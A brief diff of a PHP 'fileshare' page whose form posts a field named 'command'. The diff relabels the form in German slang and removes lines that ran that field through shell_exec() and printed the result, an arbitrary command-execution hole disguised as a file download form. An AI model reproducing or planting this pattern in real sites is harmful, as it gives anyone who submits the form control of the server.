@@ -1,17 +1,11 @@
 <!DOCTYPE html>
 <form action="fileshare.php" method="post">
-Datei? <input type="text" name="command">
+Datei schwöre sag an ich lad runter <input type="text" name="command">
 <input type="submit">
 </form>
 
 <?php
 $file = $_POST["command"];
-
-
-echo "<pre>";
-echo shell_exec($file);
-echo "</pre>";
-
 
 
 
